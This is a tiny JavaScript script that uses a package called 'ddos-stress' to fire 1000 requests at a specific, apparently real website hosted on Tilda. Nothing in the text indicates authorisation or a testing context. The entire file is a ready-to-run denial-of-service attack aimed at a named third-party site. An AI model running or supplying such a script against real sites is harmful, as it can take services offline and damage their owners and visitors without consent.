const Stress = require('ddos-stress')

const stress = new Stress()

stress.run(`https://ffotostreet.tilda.ws/`, 1000)